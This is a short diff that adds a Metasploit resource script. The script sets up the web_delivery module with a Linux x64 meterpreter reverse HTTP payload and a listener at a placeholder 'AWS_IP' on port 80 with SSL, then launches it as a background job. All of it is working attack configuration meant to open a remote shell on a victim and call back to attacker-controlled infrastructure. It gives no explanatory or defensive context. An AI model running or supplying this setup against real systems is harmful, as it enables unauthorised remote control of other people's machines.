@@ -1,0 +1,12 @@
+use exploit/multi/script/web_delivery
+show targets
+set target 6
+show payloads
+set payload linux/x64/meterpreter_reverse_http
+set URIPATH delivery
+set LURI handler
+set LPORT 80
+set LHOST AWS_IP
+set ReverseListenerBindPort 4444
+set SSL true
+exploit -jz
